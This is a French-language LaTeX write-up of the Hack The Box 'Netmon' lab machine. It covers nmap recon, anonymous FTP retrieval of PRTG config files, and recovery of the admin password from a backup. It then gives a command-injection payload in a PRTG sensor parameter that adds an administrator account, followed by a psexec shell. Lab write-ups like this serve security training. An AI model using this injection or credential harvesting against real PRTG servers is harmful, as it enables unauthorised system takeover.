\chapter{Netmon}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: prtg 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX netmon.xml 10.10.10.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 05:23 CEST
Nmap scan report for 10.10.10.152
Host is up (0.033s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-09-29T03:32:27
|_  start_date: 2022-09-29T03:16:52
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

\end{verbatim}

\subsubsection{searchsploit}
\begin{verbatim}
$ searchsploit prtg

PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution
    windows/webapps/46527.sh
\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
$ enum4linux-ng -A 10.10.10.152

\end{verbatim}
pas grand chose a voir

\subsubsection{ftp}
\begin{verbatim}
$ ftp anonymous@10.10.10.152

\end{verbatim}

dans les logs on trouve cela \verb+netmon\administrator+
\begin{verbatim}
ls "Program Files (x86)"/"PRTG Network Monitor"/webroot
\end{verbatim}

en cherchant sur google \verb+prtg config file+
on trouve
\url{https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data}


donc on prend les fichier de conf et dans le xml on a :
\begin{verbatim}
    <recipient>
      na@na.com
    </recipient>

<login>
  prtgadmin
</login>

<password>
  <flags>
    <encrypted/>
  </flags>
  <cell col="0" crypt="PRTG">
    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======
  </cell>
  <cell col="1" crypt="PRTG">
    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW
  </cell>
</password>
\end{verbatim}

dans \verb+Configuration.old.bak+ on \verb+PrTg@dmin2018+ qui ne fonctionne pas
par contre \verb+PrTg@dmin2019+




\subsection{Foothold}

\subsubsection{nmap}

Ajouter un sensor sur le groupe \verb+10.10.10.152+ de type 
\verb+EXE / script+ on peut choisir 
\verb+Demo Powershell - returns a fixed integer value.ps1+
en parametre on met 

\begin{verbatim}
test.txt;net user pwn pwn /add;net localgroup administrators pwn /add
\end{verbatim}

on aurit pu mettre un reverse shell

Puis il suffit de lancer le sensor.


On aurait pu aussi ajouter une alerte.
login puis \verb+setup > Account Settings > notifications+

creer une nouvelle avec execution de prgramme \verb+Demo exec notif - outfile.ps1+

\begin{verbatim}
$ psexec.py 'toto:pwn!2019Pwn@10.10.10.152'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file LrAaZsZS.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service rVrr on 10.10.10.152.....
[*] Starting service rVrr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
\end{verbatim}


